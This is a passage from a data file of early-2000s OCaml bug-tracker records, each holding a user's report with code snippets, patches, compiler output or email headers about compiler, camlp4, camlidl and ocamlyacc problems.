2\nfrouaix:~/Documents/src/FRX/jaws$ ocamlc -v\nThe Objective Caml compiler, version 3.06+21 (2003-01-08)\nStandard library directory: /usr/local/lib/ocamlexp/lib/ocaml\n"},{"labels":["bug"],"text":"**Original bug ID:** 1598\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nLooking at http://caml.inria.fr/ocaml/htmlman/manual015.html, the only\nway \"a := b\" could be an expression is in the \"expr infix-op expr\" case.  \nLower on the same page, it says \"infix-op\" can be \"infix-symbol\" or a\nfew things other than \":=\".  \"infix-symbol\" is defined at\nhttp://caml.inria.fr/ocaml/htmlman/manual009.html, where it says that\ninfix symbols don't start with a colon.  Thus \":=\" is not an\ninfix-symbol or an infix-op, and \"a := b\" is not an expression.\n\nYou could fix this by altering the definition of \"infix-op\" or\n\"infix-symbol\".  Note that the \"operator-name\" production in manual11.html\nhas a special case for \":=\".  If you change \"infix-symbol\" to include\n\":=\", you probably want to remove that special case from \"operator-name\".\n-- \nTim Freeman                                                  tim@fungible.com\nWhich is worse: ignorance or apathy? Who knows? Who cares?\nGPG public key fingerprint ECDF 46F8 3B80 BB9E 575D  7180 76DF FE00 34B1 5C78\n"},{"labels":["bug"],"text":"**Original bug ID:** 1597\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFolks,\n\nI wrote to Pierre.Weis@inria.fr, as mentioned at the top of\nhttp://caml.inria.fr/FAQ/FAQ_DEBUTANT-eng.html but the message bounced.\nCan anyone have a look at this? Thanks!\n\nRegards,\n\n\tJens\n-- \nJens Schweikhardt http://www.schweikhardt.net/\nSIGSIG -- signature too long (core dumped)\n\n----------------\nReturn-Path: <MAILER-DAEMON@schweikhardt.net>\nReceived: from hal9000.schweikhardt.net (localhost [127.0.0.1])\n\tby hal9000.schweikhardt.net (8.12.8/8.12.8) with ESMTP id h2GHpwt1050626\n\tfor <schweikh@schweikhardt.net>; Sun, 16 Mar 2003 18:51:58 +0100 (CET)\n\t(envelope-from MAILER-DAEMON@hal9000.schweikhardt.net)\nReceived: (from uucp@localhost)\n\tby hal9000.schweikhardt.net (8.12.8/8.12.6/Submit) with UUCP id h2GHpwK3050625\n\tfor schweikh@schweikhardt.net; Sun, 16 Mar 2003 18:51:58 +0100 (CET)\nReceived: from concorde.inria.fr (concorde.inria.fr [192.93.2.39])\n\tby bremen.shuttle.de (Postfix) with ESMTP id D1F4B17D43\n\tfor <schweikh@schweikhardt.net>; Sun, 16 Mar 2003 17:58:57 +0100 (CET)\nReceived: from pauillac.inria.fr (pauillac.inria.fr [128.93.11.35])\n\tby concorde.inria.fr (8.11.1/8.11.1) with ESMTP id h2GGwvf05036\n\tfor <schweikh@schweikhardt.net>; Sun, 16 Mar 2003 17:58:57 +0100 (MET)\nReceived: from localhost (localhost) by pauillac.inria.fr (8.7.6/8.7.3) with internal id RAA25880; Sun, 16 Mar 2003 17:58:57 +0100 (MET)\nDate: Sun, 16 Mar 2003 17:58:57 +0100 (MET)\nFrom: Mail Delivery Subsystem <MAILER-DAEMON@pauillac.inria.fr>\nSubject: Returned mail: unknown mailer error 1\nMessage-Id: <200303161658.RAA25880@pauillac.inria.fr>\nTo: <schweikh@schweikhardt.net>\nMIME-Version: 1.0\nContent-Type: multipart/report; report-type=delivery-status;\n\tboundary=\"RAA25880.1047833937/pauillac.inria.fr\"\nAuto-Submitted: auto-generated (failure)\nX-Spam: no; 0.00; transcript:01 554:01 addresses:97 -----:12 error:16 session:19 bin:21 from:72 unknown:71 following:69 home:67 not:66 the:64 have:62 delivery:60 \nX-Subject-Unreadable: no; 0/32\n\nThis is a MIME-encapsulated message\n\n--RAA25880.1047833937/pauillac.inria.fr\n\nThe original message was received at Sun, 16 Mar 2003 17:58:56 +0100 (MET)\nfrom concorde.inria.fr [192.93.2.39]\n\n   ----- The following addresses have delivery notifications -----\n|/home/pauillac/cristal1/weis/bin/mailfilter  (unrecoverable error)\n    (expanded from: <weis@pauillac.inria.fr>)\n\n   ----- Transcript of session follows -----\nsh: /home/pauillac/cristal1/weis/bin/mailfilter: not found\n554 |/home/pauillac/cristal1/weis/bin/mailfilter... unknown mailer error 1\n\n--RAA25880.1047833937/pauillac.inria.fr\nContent-Type: message/delivery-status\n\nReporting-MTA: dns; pauillac.inria.fr\nReceived-From-MTA: DNS; concorde.inria.fr\nArrival-Date: Sun, 16 Mar 2003 17:58:56 +0100 (MET)\n\nFinal-Recipient: RFC822; weis@pauillac.inria.fr\nX-Actual-Recipient: RFC822; |/home/pauillac/cristal1/weis/bin/mailfilter@pauillac.inria.fr\nAction: failed\nStatus: 5.0.0\nLast-Attempt-Date: Sun, 16 Mar 2003 17:58:57 +0100 (MET)\n\n--RAA25880.1047833937/pauillac.inria.fr\nContent-Type: message/rfc822\n\nReturn-Path: schweikh@schweikhardt.net\nReceived: from concorde.inria.fr (concorde.inria.fr [192.93.2.39]) by pauillac.inria.fr (8.7.6/8.7.3) with ESMTP id RAA26142 for <weis@pauillac.inria.fr>; Sun, 16 Mar 2003 17:58:56 +0100 (MET)\nReceived: from bremen.shuttle.de (bremen.shuttle.de [194.95.249.251])\n\tby concorde.inria.fr (8.11.1/8.11.1) with ESMTP id h2GGwtf05033\n\tfor <Pierre.Weis@inria.fr>; Sun, 16 Mar 2003 17:58:56 +0100 (MET)\nReceived: from bremen.shuttle.de (localhost [127.0.0.1])\n\tby bremen.shuttle.de (Postfix) with ESMTP id B705D17D4A\n\tfor <Pierre.Weis@inria.fr>; Sun, 16 Mar 2003 17:58:54 +0100 (CET)\nReceived: (from uucp@localhost)\n\tby bremen.shuttle.de (8.12.3/8.12.3/Debian-5) with UUCP id h2GGws1X002780\n\tfor Pierre.Weis@inria.fr; Sun, 16 Mar 2003 17:58:54 +0100\nReceived: from hal9000.schweikhardt.net (localhost [127.0.0.1])\n\tby hal9000.schweikhardt.net (8.12.8/8.12.8) with ESMTP id h2GGxot1049492\n\tfor <Pierre.Weis@inria.fr>; Sun, 16 Mar 2003 17:59:50 +0100 (CET)\n\t(envelope-from schweikh@hal9000.schweikhardt.net)\nReceived: (from schweikh@localhost)\n\tby hal9000.schweikhardt.net (8.12.8/8.12.6/Submit) id h2GGxoKS049491\n\tfor Pierre.Weis@inria.fr; Sun, 16 Mar 2003 17:59:50 +0100 (CET)\nDate: Sun, 16 Mar 2003 17:59:50 +0100\nFrom: Jens Schweikhardt <schweikh@schweikhardt.net>\nTo: Pierre.Weis@inria.fr\nSubject: bug during configuration of ocaml\nMessage-ID: <20030316165950.GA49272@schweikhardt.net>\nMime-Version: 1.0\nContent-Type: text/plain; charset=us-ascii\nContent-Disposition: inline\nUser-Agent: Mutt/1.4i\n\nCher Pierre,\n\nI'm trying to compile the lang/ocaml port on FreeBSD 4.8-RC. The\nconfigure script apparently runs a program to test wether stack overflow\ncan be detected.\n\nSnippet from configure:\n...\n\t# Determine if system stack overflows can be detected\n\n\tif test a = a; then\n\tset -x\n\tcase \"$arch,$model,$system\" in\n\t  i386,*,*)\n\t\tcase \"$host\" in              # Check for FreeBSD 4.5 bug\n\t\t  *-*-freebsd*|*-*-openbsd*) check_pthread=yes ;;\n\t\t  *)                         check_pthread=no ;;\n\t\tesac\n\t\tif ./runtest -DTARGET_$arch -DSYS_$system stackov.c \\\n\t\t&& test $check_pthread = no || cclibs=\"-pthread $cclibs\" \\\n\t\t\t   ./runtest -DTARGET_$arch -DSYS_$system stackov.c; then\n\t\t  echo \"System stack overflow can be detected.\"\n\t\t  echo \"#define HAS_STACK_OVERFLOW_DETECTION\" >> s.h\n\t\telse\n\t\t  echo \"Cannot detect system stack overflow.\"\n\t\tfi;;\n\t  *)\n\t\t  echo \"Cannot detect system stack overflow.\";;\n\tesac\n\n\nThe \"tst\" program run by ./runtest hangs indefinitely and eats all\navailable CPU. It can not be killed with TERM, HUP, INT or QUIT, but\nonly with kill -KILL.\n\nI have traced the problem down to\n\n # cd /usr/ports/lang/ocaml/work/ocaml-3.06/config/auto-aux\n # cclibs=-pthread  ./runtest -DTARGET_i386 -DSYS_bsd_elf stackov.c\n\nThe program runs fine without cclibs=-pthread\nCould you have a look at this? Merci!\n\nRegards,\n\n\tJens\n-- \nJens Schweikhardt http://www.schweikhardt.net/\nSIGSIG -- signature too long (core dumped)\n\n--RAA25880.1047833937/pauillac.inria.fr--\n\n----------------\n----------------\n"},{"labels":["bug"],"text":"**Original bug ID:** 1596\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nBonjour,\n\nJ'ai l'impression que le manuel oublie de signaler que les exÃ©cutables\nproduits par ocamlopt reconnaissent la variable OCAMLRUNPARAM. Pourtant Ã§a\nmarche.\n\n\n  Alain\n"},{"labels":["bug",null],"text":"**Original bug ID:** 1595\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** -for CamlIDL use https://github.com/xavierleroy/camlidl/issues\n\n## Bug description\n\nFull_Name: Stefano Zacchiroli\nVersion: 3.06\nOS: Debian GNU/Linux\nSubmission from: host204-63.pool80117.interbusiness.it (80.117.63.204)\n\n\ncamlidl lacks a manpage.\n\nFollow the manpage we are using in the camlidl debian package. It was provided\nby Georges Mariano.\n\nThanks,\nCheers.\n\n.\\\"                                      Hey, EMACS: -*- nroff -*-\n.\\\" First parameter, NAME, should be all caps\n.\\\" Second parameter, SECTION, should be 1-8, maybe w/ subsection\n.\\\" other parameters are allowed: see man(7), man(1)\n.TH CAMLIDL SECTION \"novembre  7, 2001\"\n.\\\" Please adjust this date whenever revising the manpage.\n.\\\"\n.\\\" Some roff macros, for reference:\n.\\\" .nh        disable hyphenation\n.\\\" .hy        enable hyphenation\n.\\\" .ad l      left justify\n.\\\" .ad b      justify to both left and right margins\n.\\\" .nf        disable filling\n.\\\" .fi        enable filling\n.\\\" .br        insert line break\n.\\\" .sp <n>    insert n+1 empty lines\n.\\\" for manpage-specific macros, see man(7)\n.SH NAME\ncamlidl \\- a stub code generator for Objective Caml\n.SH SYNOPSIS\n.B camlidl\n.RI [options] <.idl file> ... <.idl file>\n.SH DESCRIPTION\nThis manual page documents briefly the\n.B camlidl\ncommand.\nThis manual page was written for the Debian GNU/Linux distribution\nbecause the original program does not have a manual page.\n.PP\n.\\\" TeX users may be more comfortable with the \\fB<whatever>\\fP and\n.\\\" \\fI<whatever>\\fP escape sequences to invode bold face and italics, \n.\\\" respectively.\n\\fBcamlidl\\fP is a program that generates\nstub code for interfacing Caml with C from an IDL description of the C\nfunctions.\n.SH OPTIONS\nA summary of options is included below.\n.TP\n.B \\-I <dir>  Add directory to search path\n.TP\n.B \\-D <symbol>  Pass -D<symbol> to the C preprocessor\n.TP\n.B \\-cpp   \nPass the .idl files through the C preprocessor (default)\n.TP\n.B \\-nocpp   \nDo not pass the .idl files through the C preprocessor\n.TP\n.B \\-prepro <cmd>  \nUse <cmd> as the preprocessor instead of the C preprocessor\n.TP\n.B \\-header   \nGenerate a .h file containing all type definitions\n.TP\n.B \\-no-include   \nDo not #include the .h file in the generated .c file\n.TP\n.B \\-prefix-all-labels   \nPrefix all ML name of record labels with name of enclosing struct\n.TP\n.B \\-keep-labels   \nDo not prefix ML names of record labels, even if ambiguous\n.TP\n.B \\-help\nShow summary of options.\n.TP\n.B \\-v, \\-\\-version\nShow version of program.\n.SH AUTHOR\nThis manual page was written by Georges Mariano <georges.mariano@inrets.fr>,\nfor the Debian GNU/Linux system (but may be used by others).\n"},{"labels":["bug",null],"text":"**Original bug ID:** 1594\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** -for CamlIDL use https://github.com/xavierleroy/camlidl/issues\n\n## Bug description\n\nFull_Name: Stefano Zacchiroli\nVersion: 3.06\nOS: linux\nSubmission from: host204-63.pool80117.interbusiness.it (80.117.63.204)\n\n\nCamlidl installation has no bytecode/nativecode split installation process.\nThis forces user that lack a nativecode compiler to manually patch Makefiles.\n\nFollow patches I've applied to the debian package to ease build process on archs\nwhich don't have native code compiler.\n\nThanks,\nCheers.\n\n--- camlidl-1.04.orig/lib/Makefile\n+++ camlidl-1.04/lib/Makefile\n@@ -19,8 +19,11 @@\n NATIVEOBJS=$(BYTEOBJS:.cmo=.cmx)\n NATIVELIB=$(BYTELIB:.cma=.cmxa)\n INTERFACES=$(BYTEOBJS:.cmo=.cmi)\n+LIBEXT=a\n\n-all: $(BYTELIB) $(NATIVELIB)\n+all: $(BYTELIB)\n+\n+opt: $(NATIVELIB)\n \n $(BYTELIB): $(BYTEOBJS)\n  $(OCAMLC) -a -o $(BYTELIB) $(BYTEOBJS)\n@@ -29,8 +32,14 @@\n  $(OCAMLOPT) -a -o $(NATIVELIB) $(NATIVEOBJS)\n \n install:\n- cp $(INTERFACES) $(BYTELIB) $(NATIVELIB) $(NATIVELIB:.cmxa=.$(LIBEXT))\n$(OCAMLLIB)\n- cd $(OCAMLLIB); $(RANLIB) $(NATIVELIB:.cmxa=.$(LIBEXT))\n+ cp $(INTERFACES) $(BYTELIB) $(OCAMLLIB)\n+ if [ -x /usr/bin/ocamlopt ]; then \\\n+   cp $(NATIVELIB) $(NATIVELIB:.cmxa=$(LIB)) $(OCAMLLIB);  \\\n+   cd $(OCAMLLIB); \\\n+   $(RANLIB) $(NATIVELIB:.cmxa=$(LIB));  \\\n+ else  \\\n+   true; \\\n+ fi\n\n .SUFFIXES: .mli .ml .cmi .cmo .cmx\n\n@@ -43,7 +52,7 @@\n\n # Clean up\n clean::\n- rm -f *.cm[ioax] $.cmxa *~\n+ rm -f *.cm[ioax] *.cmxa *.a *.o *~\n\n # Dependencies\n depend:\n--- camlidl-1.04.orig/Makefile\n+++ camlidl-1.04/Makefile\n@@ -20,6 +20,9 @@\n  cd lib; $(MAKE) all\n  cd tools; $(MAKE) all\n\n+opt:\n+ cd lib; $(MAKE) opt\n+\n install:\n  cd compiler; $(MAKE) install\n  cd runtime; $(MAKE) install\n"},{"labels":["bug"],"text":"**Original bug ID:** 1593\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nThe subject line I gave for the bug is misleading, since the following\ncode gets essentially the same error and has no typedef and no type\n\"any\":\n\n   module type Unintern_strategy = sig\n     val unintern_eventdesc: ([>`ANY] as 'a) -> 'a list\n   end\n     \n   module Intern_strategy_tweaked : Unintern_strategy =\n   struct\n     let unintern_eventdesc : ([>`ANY] as 'a) -> 'a list = failwith \"ouch\"\n   end\n\n-- \nTim Freeman                                                  tim@fungible.com\nWhich is worse: ignorance or apathy? Who knows? Who cares?\nGPG public key fingerprint ECDF 46F8 3B80 BB9E 575D  7180 76DF FE00 34B1 5C78\n"},{"labels":["bug"],"text":"**Original bug ID:** 1592\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nIf \"any\" means \"[`ANY]\", then it seems to me that \"[>any]\" ought to\nmean the same thing as \"[>`ANY]\".  The implementation apparently\ndisagrees.  The following program does not compile, either in ocaml\n3.06-15 from Debian or in a CVS archive I updated a few hours ago:\n\n   type any = [`ANY]\n\n   module type Unintern_strategy = sig\n     val unintern_eventdesc: ([>`ANY] as 'a) -> 'a list\n   end\n     \n   module Intern_strategy_tweaked : Unintern_strategy =\n   struct\n     let unintern_eventdesc : ([>any] as 'a) -> 'a list = failwith \"ouch\"\n   end\n\nThe error message is:\n\n   Signature mismatch:\n   Modules do not match:\n     sig val unintern_eventdesc : (_[> any] as 'a) -> '_a list end\n   is not included in\n     Unintern_strategy\n   Values do not match:\n     val unintern_eventdesc : (_[> any] as 'a) -> '_a list\n   is not included in\n     val unintern_eventdesc : ([> `ANY] as 'a) -> 'a list\n\nThe \"_\"'s in the types are probably significant, but I don't know\nwhere they came from or what they mean.  I know that \"_\"'s were used\nto indicate weak type variables at one point in Standard ML, but I\nthought ocaml didn't have weak type variables.\n\n-- \nTim Freeman                                                  tim@fungible.com\nWhich is worse: ignorance or apathy? Who knows? Who cares?\nGPG public key fingerprint ECDF 46F8 3B80 BB9E 575D  7180 76DF FE00 34B1 5C78\n"},{"labels":["bug"],"text":"**Original bug ID:** 1591\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nAt the end of this message is a uuencoded gzipped tar file containing\na small set of sources for reproducing a compiler problem.  61 lines\ntotal.  Here's the terminal output when it breaks:\n\n   lobus:~/s/conscious> ./compile\n   rm: No match.\n   setenv OCAMLC /usr/bin/ocamlc\n   /usr/bin/ocamlc -c s_conscious_data.ml\n   /usr/bin/ocamlc -c conscious_data.mli\n   /usr/bin/ocamlc -c conscious_data.ml\n   /usr/bin/ocamlc -c s_conscious.ml\n   /usr/bin/ocamlc -c conscious.mli\n   /usr/bin/ocamlc -c conscious.ml\n   The implementation conscious.ml does not match the interface conscious.cmi:\n   Module type declarations do not match:\n     module type Unintern_strategy =\n       sig\n         val unintern_eventdesc :\n           ([> `ANY] as 'a) list list -> 'a Conscious_data.eventdesc\n       end\n   does not match\n     module type Unintern_strategy =\n       sig\n         val unintern_eventdesc :\n           ([> `ANY] as 'a) list list -> 'a Conscious_data.eventdesc\n       end\n   Modules do not match:\n     sig\n       val unintern_eventdesc :\n         ([> `ANY] as 'a) list list -> 'a Conscious_data.eventdesc\n     end\n   is not included in\n     sig\n       val unintern_eventdesc :\n         ([> `ANY] as 'a) list list -> 'a Conscious_data.eventdesc\n     end\n   Values do not match:\n     val unintern_eventdesc :\n       ([> `ANY] as 'a) list list -> 'a Conscious_data.eventdesc\n   is not included in\n     val unintern_eventdesc :\n       ([> `ANY] as 'a) list list -> 'a Conscious_data.eventdesc\n   rm -f conscious.cmi conscious_data.cmi s_conscious.cmi s_conscious_data.cmi conscious_data.cmo s_conscious.cmo s_conscious_data.cmo\n   lobus:~/s/conscious> \n\nThe problem is that it fails when saying that two values with\napparently identical types do not match.\n\nI can cause this behavior with the Debian 3.06-15 build, or with a CVS\nimage I updated a few hours ago.\n\nThere are two occurrences of \n\n  type process_identifier = int\n\nin the source.  If I delete them and replace all occurrences of\n\"process_identifier\" with \"int\", the problem goes away.  There are a\nnumber of other small changes I can make to the source to make the\nproblem go away, but this one is the strangest because it shouldn't\naffect the meaning at all.\n-- \nTim Freeman                                                  tim@fungible.com\nWhich is worse: ignorance or apathy? Who knows? Who cares?\nGPG public key fingerprint ECDF 46F8 3B80 BB9E 575D  7180 76DF FE00 34B1 5C78 \n\nbegin 664 ouch.tar.gz\nM'XL(`!5E<3X``^U864_;0!#.LW_%5%3BJ.)C?4E104*T#Y5Z/*`^5`B%S7HA\nM\"SXB[YJ\">OSV[JZ=Q($D5A$.(/Q%L:W,9&;D];<SGTVKUSILVT-AZ,NS[82^\nM73]/T;/#P/50@-PPD+^'GAWTP&^_M%ZOX`+G`#W!DK5^3?87\"M,B63)A,6TQ\nMA^W(%?57K[_O^;7U]Y1_Z(<]L%NL:897OOY;;ZP12RU!^!CZ-T:>0/\\<]DR2\nM,'W,C\"U.!4VOX=O1X9?/1V\":VC\\C.(G)7:,U+BZH)>^45:1C3*YHU->.?9QF\nM:9]<<XNE\\G;',8WJ4>X$*7A>M[[]51K^0)\\`'Y(LY81E!1]&6&`SB1<=[IE9\nM@WUE_-6AUT15?[I_#Y]ZD=?`M$RY+NPBS?+6M@#%_\\#S5O+?L5W)?]^SY0<%\nM<O]W'#=P.OYO`F9$)S2-C+V_!M&$@_)DBFP\"@G+AZ\".\"RR*],HBZUL01-\\+8\nMTT1XSD]WAR:H_C_?N]K)H?D?K.8_\\KU9_[<=S?_0M3O^;P))%A4QA:,/L`]'\nM\"[W1,\"J;N)U0^)ZR5-`\\'7*18T$O;J6_;!L&P#6.H9A:Z35-140Y&4@+P,[)\nMP=GAUQ^G@#ELXUV(&1?ZH*W]`_GCG:SF+(*AMB4`0[LJ=!M-\"UCD/VLE1Q/_\nM;114_$>AKZX=Y-A^Q_]-@*4D+B(*Q[7!][ACVJM!C?]31?3H.9KX'WCS]S\\(\nMN8K_(>KZ_T:@F_LDSPCE?,@BV7O9.:.Y[.ZRHQN&-M,;U=MQ/,SR8=GG9<O?\nMAY.SCY4!LO-E,7[#V:?*_51W\\3+<SKOMT2[@]+:<%EA4)5,/HAPNY\"5LCU3\\\nM]TLSJU`&B3'GY61RTM_&IW\">Y0D60E5N9*-+2M2(48^(=<15`1,JQEE419G6\nM-13X8@`[:G\"I5RO'%CGO\"#V?+!2BZIB-+S+=K(XJ>E0DD\\'RNSDO?R%Z^^+*\nMM!9?>;21HXG_KC]__V>7_$<^ZOB_\"=1G_./93#]3!8/Z8%`VB&,HN3SS:M`'\nMZQ5\"DT9H5`D`FBGZ\\).),:Q1-$]]LY\\AEO3_1Q<!C?._ZT[Y[[C*SW'ML./_\nM1K!D_J]HWK'E-6\"A_[>D`)KX'R*W-O\\CQ7_DN1W_-X'E_;]!%50.CZ(+IL%6\nMJ8+%*7ZM+E\"^ZW0!S\"?R_]$&#U,'Y5P\"-=PI;Z5:>)A>*/.I[U,_4ATZ=.C0\n,X07@'_A.C=4`*```\n`\nend\n"},{"labels":["bug"],"text":"**Original bug ID:** 1590\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Brian Rogoff\nVersion: 3.06\nOS: Solaris\nSubmission from: 192-149-105-50.artisan.com (192.149.105.50)\n\n\nlet fp_test x = \n  match x with\n    0. ->   Printf.printf \"MATCHED: x = 0\\n\"\n  | 90. ->  Printf.printf \"MATCHED: x = 90\\n\"\n  | 180. -> Printf.printf \"MATCHED: x = 180\\n\"\n  | 270. -> Printf.printf \"MATCHED: x = 270\\n\"\n  | _ -> Printf.printf \"x = %g\\n\" x;;\n\nTry this with values 0., 90., 180., 270. Results are: \n\n# fp_test 0.;;\nMATCHED: x = 0\n- : unit = ()\n# fp_test 90.;;\nx = 90\n- : unit = ()\n# fp_test 180.;;\nMATCHED: x = 180\n- : unit = ()\n# fp_test 270.;;\nMATCHED: x = 270\n- : unit = ()\n\nWhen I run with -dlambda, I get this code for fp_test\n\n(let\n  (fp_test/64\n     (function x/65\n       (catch\n         (if (<. x/65 270.)\n           (if (!=. x/65 0.)\n             (if (!=. x/65 180.) (exit 1)\n               (apply (field 1 (global Printf!)) \"MATCHED: x = 180\\n\"))\n             (apply (field 1 (global Printf!)) \"MATCHED: x = 0\\n\"))\n           (if (!=. x/65 270.)\n             (if (!=. x/65 90.) (exit 1)\n               (apply (field 1 (global Printf!)) \"MATCHED: x = 90\\n\"))\n             (apply (field 1 (global Printf!)) \"MATCHED: x = 270\\n\")))\n        with (1) (apply (field 1 (global Printf!)) \"x = %g\\n\" x/65))))\n  (apply (field 1 (global Toploop!)) \"fp_test\" fp_test/64))\n\nwhich will clearly (ahem! ;) never print \"MATCHED: x = 90\". So this code is\nwrong \nI think. \n\n-- Brian\n"},{"labels":["bug"],"text":"**Original bug ID:** 1588\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Julien Signoles\nVersion: 3.06\nOS: Linux\nSubmission from: newwww.lri.fr (129.175.15.10)\n\n\n$ cat foo.ml\nlet _ = if print_endline \"a\"; 0 = 1 then () else assert false\n$ camlp4o pr_o.cmo foo.ml > foo_p4.ml\n$ cat foo_p4.ml\nlet _ = assert begin print_endline \"a\"; 0 = 1 end\n$ ocamlc -noassert -o foo foo.ml\n$ ./foo\na\nFatal error: exception Assert_failure(\"assert.ml\", 30, 42)\n$ ocamlc -noassert -o foo_p4 foo_p4.ml\n$ ./foo_p4\n$\n\nAs camlp4 automatically changes \"if cond then () else assert false\" by \"assert\n(cond)\", there is no more assert failure if you use -noassert (except when cond\n= false (syntactically)).\nMorever, side effects semantic is modified.\n\n--\nJulien Signoles.\n"},{"labels":["bug"],"text":"**Original bug ID:** 1587\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Olivier Andrieu\nVersion: 3.06+\nOS: \nSubmission from: akasha.ijm.jussieu.fr (134.157.173.57)\n\n\nBonjour,\n\ncamlp4 ne parse pas le type \"unknown\" pour les variants polymorphes ( [> ] ).\nVoilÃ  un petit patch corrigeant Ã§a :\n\n--- camlp4/etc/pa_o.ml\t2002/07/19 14:53:45\t1.43\n+++ camlp4/etc/pa_o.ml\t2003/03/12 10:38:26\n@@ -1097,7 +1097,7 @@\n   ctyp: LEVEL \"simple\"\n     [ [ \"[\"; OPT \"|\"; rfl = LIST0 row_field SEP \"|\"; \"]\" ->\n           <:ctyp< [ = $list:rfl$ ] >>\n-      | \"[\"; \">\"; OPT \"|\"; rfl = LIST1 row_field SEP \"|\"; \"]\" ->\n+      | \"[\"; \">\"; OPT \"|\"; rfl = LIST0 row_field SEP \"|\"; \"]\" ->\n           <:ctyp< [ > $list:rfl$ ] >>\n       | \"[<\"; OPT \"|\"; rfl = LIST1 row_field SEP \"|\"; \"]\" ->\n           <:ctyp< [ < $list:rfl$ ] >>\n"},{"labels":["bug"],"text":"**Original bug ID:** 1586\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFrom: mgushee@havenrock.com\n\n> LablTk specifies a type of float for the 'weight' argument to\n> Grid.column_configure and Grid.row_configure, but Tk expects an integer.\n\nYou're right. Thank you for pointing the problem.\nI suppose this became apparent due to a recent change in\nstring_of_float, which adds '.' even to integral values.\nThis will be fixed as you suggest.\n\nJacques Garrigue\n"},{"labels":["bug"],"text":"**Original bug ID:** 1584\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Manos Renieris\nVersion: 3.02-3.06\nOS: Solaris/Linux\nSubmission from: miette.cs.brown.edu (128.148.38.66)\n\n\nI'm not sure this is a bug, but it is a bit unexpected.\n\nIf I type\n  -.9\nor even\n  -. 9\nthe value I get back is -9, as an int.\n\nmiette /u/er -> o\n        Objective Caml version 3.06\n\n# -.9;; \n- : int = -9\n\nI don't really understand why.  \n\n-- Manos\n"},{"labels":["bug"],"text":"**Original bug ID:** 1583\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Allen Stoughton\nVersion: 3.06\nOS: Linux (RedHat 7.2)\nSubmission from: dhcp9.user.cis.ksu.edu (129.130.11.178)\n\n\nAs shown in the example included below, ocamlyacc sometimes generates code\nthat's not type safe.  The problem seems to come up when the types specified\nfor\nsymbols using %type are incorrect, but are unifiable with the real types.\n\nIn the supplied example, the function returned as the value of the symbol\nstart has type (string -> 'a) -> 'a, but the type specified by the user is\n('s -> unit) -> unit.  In the file parser.ml generated by ocamlyacc,\nthe function is constrained to have type ('s -> unit) -> unit, and is then\nturned into a value of type Obj.t using Obj.repr.  Later, this value is\nturned back into a function using Obj.obj, and is expicitly given the\ntype ('s -> unit) -> unit.  It can then be passed an argument of type\n(int -> unit), resulting in a violation of the type system.\n\nThe problem seems to exist because ocamlyacc is making an assumption about\nhow type constraints work that is incorrect.  Presumably, ocamlyacc is\nhoping that the expression\n\n((fun ppf -> ppf \"file.f\") : ('s -> unit) -> unit)\n\nwon't typecheck.  Instead, it does typecheck, but with the type\n(string -> unit) -> unit.  But when this value is turned into an object and\nthen brought back to a function, it's given the incorrect type\n('s -> unit) -> unit, leading to problems.\n\n--------------------- parser.mly\n---------------------------------------------------\n%token <unit> EOF\n\n%start start\n\n%type < ('s -> unit) -> unit > start\n\n%%\n\nstart :\n    EOF\n      { fun ppf -> ppf \"file.f\" }\n--------------------- main.ml\n-------------------------------------------------------\nlet main x = Parser.EOF() in\nlet pi = open_in \"emptyfile\" in\nlet lexbuf = Lexing.from_channel pi in\nlet f = Parser.start main lexbuf in\nf (Printf.printf \"file:%d\\n\")\n"},{"labels":["bug"],"text":"**Original bug ID:** 1582\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Virgile Prevosto\nVersion: 3.06\nOS: Linux (RH 7.2)\nSubmission from: 132.227.83.215 (132.227.83.215)\n\n\nI don't know if it's really a bug or a feature of initializer (the explanation\ngiven in the manual is quite short), but it has a weird behavior when combined\nwith multiple inheritance, especially when the inheritance graph has a 'diamond'\nshape, as in the following example:\n---------------------\nclass root =\nobject\n  val mutable n = 1\n  initializer print_string \"Initialization, pass \"; print_int  n; \n              print_newline(); n <- n+1\n  method get_n () = n\nend\n\nclass foo =\nobject\n  inherit root\nend\n\nclass bar =\nobject\n  inherit root\nend\n\nclass foobar = \nobject\n  inherit bar\n  inherit foo\n  val mutable n 